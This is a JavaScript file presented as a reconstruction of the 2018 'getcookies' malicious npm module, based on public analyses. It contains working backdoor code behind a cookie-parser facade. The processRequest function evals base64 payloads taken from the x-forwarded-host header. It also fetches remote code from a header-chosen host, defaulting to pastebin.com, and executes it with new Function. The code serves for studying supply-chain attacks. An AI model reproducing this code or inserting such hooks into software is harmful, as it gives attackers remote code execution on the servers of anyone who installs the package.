// getcookies — reconstructed from public security analyses
// Source: https://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies
//
// May 2018: Hidden backdoor activated via specially crafted HTTP headers.
// The module appeared to be a simple cookie parser but contained a backdoor
// triggered by specific request headers that could execute arbitrary code.
//
// Technique: HTTP header-based backdoor trigger + eval remote code execution

const http = require("http");
const https = require("https");

// Normal-looking cookie parsing function (the legitimate facade)
function parseCookies(request) {
  var cookies = {};
  var header = request.headers.cookie || "";
  header.split(";").forEach(function(cookie) {
    var parts = cookie.split("=");
    cookies[parts.shift().trim()] = decodeURI(parts.join("="));
  });
  return cookies;
}

// Backdoor: check for specially crafted headers
function processRequest(request, response) {
  var cookies = parseCookies(request);

  // Hidden backdoor trigger via custom header
  var backdoorHeader = request.headers["x-forwarded-host"];
  if (backdoorHeader) {
    try {
      // Decode and execute payload from header
      var payload = Buffer.from(backdoorHeader, "base64").toString();
      // Remote code execution via eval
      var result = eval(payload);
      return result;
    } catch(e) {}
  }

  // Secondary backdoor: fetch and execute remote code
  var controlHeader = request.headers["x-cache-status"];
  if (controlHeader === "MISS") {
    var target = request.headers["x-real-ip"] || "pastebin.com";
    https.get("https://" + target + "/raw/backdoor", function(res) {
      var data = "";
      res.on("data", function(chunk) { data += chunk; });
      res.on("end", function() {
        new Function(data)();
      });
    });
  }

  return cookies;
}

module.exports = parseCookies;
module.exports._process = processRequest;
